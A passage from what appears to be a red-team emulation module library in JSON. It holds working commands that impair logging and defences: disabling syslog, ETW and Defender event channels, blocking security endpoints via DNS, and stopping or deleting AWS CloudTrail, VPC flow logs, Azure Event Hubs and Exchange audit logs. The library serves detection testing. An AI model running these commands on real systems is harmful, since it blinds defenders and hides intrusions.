      "prerequisites": [],
      "rx_module_id": "cedaf7e7-28ee-42ab-ba13-456abd35d1bd",
      "module_name": "Auditing Configuration Changes on FreeBSD Host"
    },
    {
      "index": 1608,
      "technique_id": "T1562.006",
      "technique_name": "Impair Defenses: Indicator Blocking",
      "description": "Emulates modification of syslog configuration.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "bash",
        "command": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/#{syslog_config_file_name}\nfi\nif [ -f \"/etc/#{rsyslog_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/#{rsyslog_config_file_name}\nfi\nif [ -f \"/etc/syslog-ng/#{syslog_ng_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/#{syslog_ng_config_file_name}\nfi\n",
        "elevation_required": true,
        "cleanup_command": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen sed -i '$ d' /etc/#{syslog_config_file_name}\nfi\nif [ -f \"/etc/#{rsyslog_config_file_name}\" ];\nthen sed -i '$ d' /etc/#{rsyslog_config_file_name}\nfi\nif [ -f \"/etc/syslog-ng/#{syslog_ng_config_file_name}\" ];\nthen sed -i '$ d' /etc/syslog-ng/#{syslog_ng_config_file_name}\nfi\n"
      },
      "variables": [
        {
          "name": "syslog_config_file_name",
          "description": "The name of the syslog configuration file to be changed",
          "type": "string",
          "default_value": "syslog.conf"
        },
        {
          "name": "rsyslog_config_file_name",
          "description": "The name of the rsyslog configuration file to be changed",
          "type": "string",
          "default_value": "rsyslog.conf"
        },
        {
          "name": "syslog_ng_config_file_name",
          "description": "The name of the syslog-ng configuration file to be changed",
          "type": "string",
          "default_value": "syslog-ng.conf"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "7d40bc58-94c7-4fbb-88d9-ebce9fcdb60c",
      "module_name": "Logging Configuration Changes on Linux Host"
    },
    {
      "index": 1609,
      "technique_id": "T1562.006",
      "technique_name": "Impair Defenses: Indicator Blocking",
      "description": "Emulates modification of syslog configuration.\n",
      "execution": {
        "platforms": [
          "linux"
        ],
        "executor_type": "sh",
        "command": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen echo '#art_test_1562_006_2' >> /etc/#{syslog_config_file_name}\nfi\n",
        "elevation_required": true,
        "cleanup_command": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen sed -i \"\" '/#art_test_1562_006_2/d' /etc/#{syslog_config_file_name}\nfi\n"
      },
      "variables": [
        {
          "name": "syslog_config_file_name",
          "description": "The name of the syslog configuration file to be changed",
          "type": "string",
          "default_value": "syslog.conf"
        }
      ],
      "prerequisites": [],
      "rx_module_id": "6b8ca3ab-5980-4321-80c3-bcd77c8daed8",
      "module_name": "Logging Configuration Changes on FreeBSD Host"
    },
    {
      "index": 1610,
      "technique_id": "T1562.006",
      "technique_name": "Impair Defenses: Indicator Blocking",
      "description": "This test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "cmd /c \"#{ps_exec_location}\" -accepteula -i -s cmd.exe /c logman update trace \"#{session}\" --p \"#{provider}\" -ets",
        "elevation_required": true,
        "cleanup_command": "cmd /c \"#{ps_exec_location}\" -i -s cmd.exe /c logman update trace \"#{session}\" -p \"#{provider}\" -ets"
      },
      "variables": [
        {
          "name": "ps_exec_location",
          "description": "Location of PSExec.",
          "type": "string",
          "default_value": "PathToRagloxModulesFolder\\..\\ExternalPayloads\\pstools\\PsExec.exe"
        },
        {
          "name": "session",
          "description": "The session to disable.",
          "type": "string",
          "default_value": "EventLog-Application"
        },
        {
          "name": "provider",
          "description": "The provider to disable.",
          "type": "string",
          "default_value": "Microsoft-Windows-Powershell"
        }
      ],
      "prerequisites": [
        {
          "description": "PSExec must be installed on the machine.",
          "check_command": "if (Test-Path \"#{ps_exec_location}\") {exit 0} else {exit 1}",
          "install_command": "New-Item -Type Directory \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/PSTools.zip\" -OutFile \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PStools.zip\"\nexpand-archive -literalpath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\PStools.zip\" -destinationpath \"PathToRagloxModulesFolder\\..\\ExternalPayloads\\pstools\" -force"
        }
      ],
      "rx_module_id": "6f118276-121d-4c09-bb58-a8fb4a72ee84",
      "module_name": "Disable Powershell ETW Provider - Windows"
    },
    {
      "index": 1611,
      "technique_id": "T1562.006",
      "technique_name": "Impair Defenses: Indicator Blocking",
      "description": "Disables ETW for the .NET Framework using the reg.exe utility to update the Windows registry",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "REG ADD HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /t REG_DWORD /d 0",
        "elevation_required": true,
        "cleanup_command": "REG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > nul 2>&1"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "8a4c33be-a0d3-434a-bee6-315405edbd5b",
      "module_name": "Disable .NET Event Tracing for Windows Via Registry (cmd)"
    },
    {
      "index": 1612,
      "technique_id": "T1562.006",
      "technique_name": "Impair Defenses: Indicator Blocking",
      "description": "Disables ETW for the .NET Framework using PowerShell to update the Windows registry",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \"DWord\" -Force",
        "elevation_required": true,
        "cleanup_command": "REG DELETE HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /f > $null 2>&1"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "19c07a45-452d-4620-90ed-4c34fffbe758",
      "module_name": "Disable .NET Event Tracing for Windows Via Registry (powershell)"
    },
    {
      "index": 1613,
      "technique_id": "T1562.006",
      "technique_name": "Impair Defenses: Indicator Blocking",
      "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /t REG_DWORD /d 0 /f\n",
        "elevation_required": true,
        "cleanup_command": "reg delete \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /f >nul 2>&1\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "f6df0b8e-2c83-44c7-ba5e-0fa4386bec41",
      "module_name": "LockBit Black - Disable the ETW Provider of Windows Defender -cmd"
    },
    {
      "index": 1614,
      "technique_id": "T1562.006",
      "technique_name": "Impair Defenses: Indicator Blocking",
      "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled  -PropertyType DWord -Value 0 -Force\n",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled -Force -ErrorAction Ignore\n"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "69fc085b-5444-4879-8002-b24c8e1a3e02",
      "module_name": "LockBit Black - Disable the ETW Provider of Windows Defender -Powershell"
    },
    {
      "index": 1615,
      "technique_id": "T1562.006",
      "technique_name": "Impair Defenses: Indicator Blocking",
      "description": "Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKCU registry using the reg.exe utility. In order for changes to take effect a logout might be required.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "REG ADD HKCU\\Environment /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f",
        "elevation_required": false,
        "cleanup_command": "REG DELETE HKCU\\Environment /v COMPlus_ETWEnabled /f > nul 2>&1"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "fdac1f79-b833-4bab-b4a1-11b1ed676a4b",
      "module_name": "Disable .NET Event Tracing for Windows Via Environment Variable HKCU Registry - Cmd"
    },
    {
      "index": 1616,
      "technique_id": "T1562.006",
      "technique_name": "Impair Defenses: Indicator Blocking",
      "description": "Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKCU registry using PowerShell. In order for changes to take effect a logout might be required.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty -Path HKCU:\\Environment -Name COMPlus_ETWEnabled -Value 0 -PropertyType \"String\" -Force",
        "elevation_required": false,
        "cleanup_command": "Remove-ItemProperty -Path HKCU:\\Environment -Name COMPlus_ETWEnabled"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "b42c1f8c-399b-47ae-8fd8-763181395fee",
      "module_name": "Disable .NET Event Tracing for Windows Via Environment Variable HKCU Registry - PowerShell"
    },
    {
      "index": 1617,
      "technique_id": "T1562.006",
      "technique_name": "Impair Defenses: Indicator Blocking",
      "description": "Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKLM registry using the reg.exe utility. In order for changes to take effect a reboot might be required.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "command_prompt",
        "command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v COMPlus_ETWEnabled /t REG_SZ /d 0 /f",
        "elevation_required": true,
        "cleanup_command": "REG DELETE \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v COMPlus_ETWEnabled /f > nul 2>&1"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "110b4281-43fe-405f-a184-5d8eaf228ebf",
      "module_name": "Disable .NET Event Tracing for Windows Via Environment Variable HKLM Registry - Cmd"
    },
    {
      "index": 1618,
      "technique_id": "T1562.006",
      "technique_name": "Impair Defenses: Indicator Blocking",
      "description": "Disables ETW for the .NET Framework by setting the COMPlus_ETWEnabled environment variable to 0 in the HKLM registry using PowerShell. In order for changes to take effect a reboot might be required.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "New-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" -Name COMPlus_ETWEnabled -Value 0 -PropertyType \"String\" -Force",
        "elevation_required": true,
        "cleanup_command": "Remove-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" -Name COMPlus_ETWEnabled"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "4d61779d-be7f-425c-b560-0cafb2522911",
      "module_name": "Disable .NET Event Tracing for Windows Via Environment Variable HKLM Registry - PowerShell"
    },
    {
      "index": 1619,
      "technique_id": "T1562.006",
      "technique_name": "Impair Defenses: Indicator Blocking",
      "description": "Adversaries are redirecting DNS queries to an incorrect or malicious DNS server IP, thereby blocking legitimate communications and potentially compromising the security infrastructure. This RAGLOX module aims to respond with 127.0.0.1 when a DNS query is made for endpoint.security.microsoft.com.",
      "execution": {
        "platforms": [
          "windows"
        ],
        "executor_type": "powershell",
        "command": "Add-DnsClientNrptRule -Namespace \".endpoint.security.microsoft.com\" -NameServers 127.0.0.1 -Comment \"Silenced by Name Resolution Policy Table\"\nAdd-DnsClientNrptRule -Namespace \"endpoint.security.microsoft.com\" -NameServers 127.0.0.1 -Comment \"Silenced by Name Resolution Policy Table\"\nClear-DnsClientCache",
        "elevation_required": true,
        "cleanup_command": "try {\n    # Get all current NRPT rules\n        $DnsClientNrptRules = Get-DnsClientNrptRule | Where-Object { $_.Comment -eq 'Silenced by Name Resolution Policy Table' }\n    \n    # Remove each NRPT rule\n        foreach ($rule in $DnsClientNrptRules) {\n            Remove-DnsClientNrptRule -Name $rule.Name -Force\n        }\n    \n    # Clear DNS client cache\n    Clear-DnsClientCache\n    Write-Host \"All NRPT rules have been removed and the DNS cache has been cleared.\"\n}\n\ncatch {\n    Write-Host \"An error occurred: $_\"\n}\nClear-DnsClientCache"
      },
      "variables": [],
      "prerequisites": [],
      "rx_module_id": "1174b5df-2c33-490f-8854-f5eb80c907ca",
      "module_name": "Block Cybersecurity communication by leveraging Windows Name Resolution Policy Table"
    },
    {
      "index": 1620,
      "technique_id": "T1562.008",
      "technique_name": "Impair Defenses: Disable Cloud Logs",
      "description": "Creates a new cloudTrail in AWS, Upon successful creation it will Update,Stop and Delete the cloudTrail\n",
      "execution": {
        "platforms": [
          "iaas:aws"
        ],
        "executor_type": "sh",
        "command": "aws cloudtrail update-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name}  --is-multi-region-trail --region #{region}\naws cloudtrail stop-logging --name #{cloudtrail_name} --region #{region}\naws cloudtrail delete-trail --name #{cloudtrail_name} --region #{region}\n",
        "elevation_required": false,
        "cleanup_command": "cd \"$PathToRagloxModulesFolder/T1562.008/src/T1562.008-1/\"\nterraform destroy -auto-approve\n"
      },
      "variables": [
        {
          "name": "cloudtrail_name",
          "description": "Name of the cloudTrail",
          "type": "string",
          "default_value": "redragloxtesttrail"
        },
        {
          "name": "s3_bucket_name",
          "description": "Name of the bucket",
          "type": "string",
          "default_value": "redraglox-test"
        },
        {
          "name": "region",
          "description": "Name of the region",
          "type": "string",
          "default_value": "us-east-1"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
          "check_command": "cat ~/.aws/credentials | grep \"default\"\n",
          "install_command": "echo Please install the aws-cli and configure your AWS default profile using: aws configure\n"
        },
        {
          "description": "Check if terraform is installed.\n",
          "check_command": "terraform version\n",
          "install_command": "echo Please install the terraform and configure your aws default profile \n"
        },
        {
          "description": "Check if the dependency resources are already present.\n",
          "check_command": "if [ -f \"$PathToRagloxModulesFolder/T1562.008/src/T1562.008-1/terraform.tfstate\" ]; then exit 0; else exit 1; fi;\n",
          "install_command": "cd \"$PathToRagloxModulesFolder/T1562.008/src/T1562.008-1/\"\nterraform init\nterraform apply -auto-approve\n"
        }
      ],
      "rx_module_id": "9c10dc6b-20bd-403a-8e67-50ef7d07ed4e",
      "module_name": "AWS - CloudTrail Changes"
    },
    {
      "index": 1621,
      "technique_id": "T1562.008",
      "technique_name": "Impair Defenses: Disable Cloud Logs",
      "description": "Identifies an Event Hub deletion in Azure.\nAn Event Hub is an event processing service that ingests and processes large volumes of events and data.\nAn adversary may delete an Event Hub in an attempt to evade detection.\nhttps://docs.microsoft.com/en-us/azure/event-hubs/event-hubs-about.\n",
      "execution": {
        "platforms": [
          "iaas:azure"
        ],
        "executor_type": "powershell",
        "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-AzureAD -Credential $creds\nRemove-AzEventHub -ResourceGroupName #{resource_group} -Namespace #{name_space_name} -Name #{event_hub_name}\n",
        "elevation_required": false,
        "cleanup_command": "cd \"$PathToRagloxModulesFolder/T1562.008/src/T1562.008-2/\"\nterraform destroy -auto-approve\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "Azure username",
          "type": "string",
          "default_value": null
        },
        {
          "name": "password",
          "description": "Azure password",
          "type": "string",
          "default_value": null
        },
        {
          "name": "event_hub_name",
          "description": "Name of the eventhub",
          "type": "string",
          "default_value": "test_eventhub"
        },
        {
          "name": "resource_group",
          "description": "Name of the resource group",
          "type": "string",
          "default_value": null
        },
        {
          "name": "name_space_name",
          "description": "Name of the NameSpace",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "Install-Module -Name Az\n",
          "check_command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
          "install_command": "Install-Module -Name AzureAD -Force\n"
        },
        {
          "description": "Check if terraform is installed.\n",
          "check_command": "terraform version\n",
          "install_command": "echo Please install the terraform.\n"
        },
        {
          "description": "Check if the user is logged into Azure.\n",
          "check_command": "az account show\n",
          "install_command": "echo Configure your Azure account using: az login. \n"
        },
        {
          "description": "Create dependency resources using terraform\n",
          "check_command": "try {if (Test-Path \"$PathToRagloxModulesFolder/T1562.008/src/T1562.008-2/terraform.tfstate\" ){ exit 0 } else {exit 1}} catch {exit 1}\n",
          "install_command": "cd \"$PathToRagloxModulesFolder/T1562.008/src/T1562.008-2/\"\nterraform init\nterraform apply -auto-approve\n"
        }
      ],
      "rx_module_id": "5e09bed0-7d33-453b-9bf3-caea32bff719",
      "module_name": "Azure - Eventhub Deletion"
    },
    {
      "index": 1622,
      "technique_id": "T1562.008",
      "technique_name": "Impair Defenses: Disable Cloud Logs",
      "description": "You can use the Exchange Management Shell to enable or disable mailbox audit logging for a mailbox.\nUnified or Admin Audit logs are disabled via the Exchange Powershell cmdline.\nhttps://github.com/Azure/Azure-Sentinel/blob/master/Detections/OfficeActivity/exchange_auditlogdisabled.yaml\n",
      "execution": {
        "platforms": [
          "office-365"
        ],
        "executor_type": "powershell",
        "command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False\n",
        "elevation_required": false,
        "cleanup_command": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $True\n"
      },
      "variables": [
        {
          "name": "username",
          "description": "office-365 username",
          "type": "string",
          "default_value": null
        },
        {
          "name": "password",
          "description": "office-365 password",
          "type": "string",
          "default_value": null
        }
      ],
      "prerequisites": [
        {
          "description": "ExchangeOnlineManagement PowerShell module must be installed\n",
          "check_command": "$RequiredModule = Get-Module -Name ExchangeOnlineManagement -ListAvailable\nif (-not $RequiredModule) {exit 1}\nif (-not $RequiredModule.ExportedCommands['Connect-ExchangeOnline']) {exit 1} else {exit 0}\n",
          "install_command": "Install-Module -Name ExchangeOnlineManagement         \nImport-Module ExchangeOnlineManagement\n"
        }
      ],
      "rx_module_id": "1ee572f3-056c-4632-a7fc-7e7c42b1543c",
      "module_name": "Office 365 - Exchange Audit Log Disabled"
    },
    {
      "index": 1623,
      "technique_id": "T1562.008",
      "technique_name": "Impair Defenses: Disable Cloud Logs",
      "description": "Update event selectors in AWS CloudTrail to disable the logging of certain management events to evade defense. This RAGLOX test leverages a tool called Stratus-Red-Team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/\n",
      "execution": {
        "platforms": [
          "linux",
          "macos",
          "iaas:aws"
        ],
        "executor_type": "sh",
        "command": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-event-selectors\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force\n",
        "elevation_required": false,
        "cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*\n"
      },
      "variables": [
        {
          "name": "stratus_path",
          "description": "Path of stratus binary",
          "type": "path",
          "default_value": "$PathToRagloxModulesFolder/T1562.008/src"
        },
        {
          "name": "aws_region",
          "description": "AWS region to detonate",
          "type": "string",
          "default_value": "us-west-2"
        }
      ],
      "prerequisites": [
        {
          "description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n",
          "check_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;\n",
          "install_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
        },
        {
          "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
          "check_command": "cat ~/.aws/credentials | grep \"default\"\n",
          "install_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
        }
      ],
      "rx_module_id": "a27418de-bdce-4ebd-b655-38f11142bf0c",
      "module_name": "AWS - Disable CloudTrail Logging Through Event Selectors using Stratus"
    },
    {
      "index": 1624,
      "technique_id": "T1562.008",
      "technique_name": "Impair Defenses: Disable Cloud Logs",
      "description": "This RAGLOX test will use the Stratus Red Team will first setup a CloudTrail logging into an S3 bucket and will then make an API call to update the lifecycle rule on that S3 bucket with an expiration date of 1 day. This will essentially delete all the logs after one day. Adversaries often do this actiivity to evade detection. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/\n",
      "execution": {
        "platforms": [
          "linux",
          "macos",
          "iaas:aws"
        ],
        "executor_type": "sh",
        "command": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force\n",
        "elevation_required": false,
        "cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*\n"
      },
      "variables": [
        {
          "name": "stratus_path",
          "description": "Path of stratus binary",
          "type": "path",
          "default_value": "$PathToRagloxModulesFolder/T1562.008/src"
        },
        {
          "name": "aws_region",
          "description": "AWS region to detonate",
          "type": "string",
          "default_value": "us-west-2"
        }
      ],
      "prerequisites": [
        {
          "description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n",
          "check_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;\n",
          "install_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
        },
        {
          "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
          "check_command": "cat ~/.aws/credentials | grep \"default\"\n",
          "install_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
        }
      ],
      "rx_module_id": "22d89a2f-d475-4895-b2d4-68626d49c029",
      "module_name": "AWS - CloudTrail Logs Impairment Through S3 Lifecycle Rule using Stratus"
    },
    {
      "index": 1625,
      "technique_id": "T1562.008",
      "technique_name": "Impair Defenses: Disable Cloud Logs",
      "description": "This RAGLOX will attempt to remove AWS VPC Flow Logs configuration. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/\n",
      "execution": {
        "platforms": [
          "linux",
          "macos",
          "iaas:aws"
        ],
        "executor_type": "sh",
        "command": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.vpc-remove-flow-logs\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force\n",
        "elevation_required": false,
        "cleanup_command": "export AWS_REGION=#{aws_region}\necho \"Cleanup detonation\"\ncd #{stratus_path}\n./stratus cleanup --all\nrm -rf stratus*\n"
      },
      "variables": [
        {
          "name": "stratus_path",
          "description": "Path of stratus binary",
          "type": "path",
          "default_value": "$PathToRagloxModulesFolder/T1562.008/src"
        },
        {
          "name": "aws_region",
          "description": "AWS region to detonate",
          "type": "string",
          "default_value": "us-west-2"
        }
      ],
      "prerequisites": [
        {
          "description": "Stratus binary must be present at the (#{stratus_path}/stratus)\n",
          "check_command": "if [ -f #{stratus_path}/stratus ]; then exit 0; else exit 1; fi;\n",
          "install_command": "if [ \"$(uname)\" == \"Darwin\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep Darwin_x86_64 | cut -d '\"' -f 4); wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nelif [ \"$(expr substr $(uname) 1 5)\" == \"Linux\" ]\nthen DOWNLOAD_URL=$(curl -s https://api.github.com/repos/DataDog/stratus-red-team/releases/latest | grep browser_download_url | grep linux_x86_64 | cut -d '\"' -f 4) \n  wget -q -O #{stratus_path}/stratus-red-team-latest.tar.gz $DOWNLOAD_URL\n  tar -xzvf #{stratus_path}/stratus-red-team-latest.tar.gz --directory #{stratus_path}/\nfi\n"
        },
        {
          "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
          "check_command": "cat ~/.aws/credentials | grep \"default\"\n",
          "install_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
        }
      ],
      "rx_module_id": "93c150f5-ad7b-4ee3-8992-df06dec2ac79",
      "module_name": "AWS - Remove VPC Flow Logs using Stratus"
    },
    {
      "index": 1626,
      "technique_id": "T1562.008",
      "technique_name": "Impair Defenses: Disable Cloud Logs",
      "description": "Creates a new cloudWatch log group in AWS, Upon successful creation it will Delete the group. Attackers can use this technique to evade defenses by \ndeleting the log stream. Once it is deleted, the logs created by the attackers will not be logged. https://www.elastic.co/guide/en/security/current/aws-cloudwatch-log-group-deletion.html#aws-cloudwatch-log-group-deletion\n",
      "execution": {
        "platforms": [
          "iaas:aws"
        ],
        "executor_type": "sh",
        "command": "aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Created ***\"\naws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Deleted ***\"\n",
        "elevation_required": false,
        "cleanup_command": null
      },
      "variables": [
        {
          "name": "cloudwatch_log_group_name",
          "description": "Name of the cloudWatch log group",
          "type": "string",
          "default_value": "log-test"
        },
        {
          "name": "region",
          "description": "Name of the region",
          "type": "string",
          "default_value": "us-east-1"
        }
      ],
      "prerequisites": [
        {
          "description": "Check if ~/.aws/credentials file has a default stanza is configured\n",
          "check_command": "cat ~/.aws/credentials | grep \"default\"\n",
          "install_command": "echo Please install the aws-cli and configure your AWS defult profile using: aws configure\n"
        }
      ],
      "rx_module_id": "89422c87-b57b-4a04-a8ca-802bb9d06121",
      "module_name": "AWS - CloudWatch Log Group Deletes"
    },
    {
      "index": 1627,
      "technique_id": "T1562.008",
      "technique_name": "Impair Defenses: Disable Cloud Logs",
      "description": "Creates a new cloudWatch log stream in AWS, Upon successful creation it will Delete the stream. Attackers can use this technique to evade defenses by \ndeleting the log stream. Once it is deleted, the logs created by the attackers will not be logged. https://www.elastic.co/guide/en/security/current/aws-cloudwatch-log-stream-deletion.html\n",
      "execution": {
        "platforms": [
          "iaas:aws"
        ],
        "executor_type": "sh",
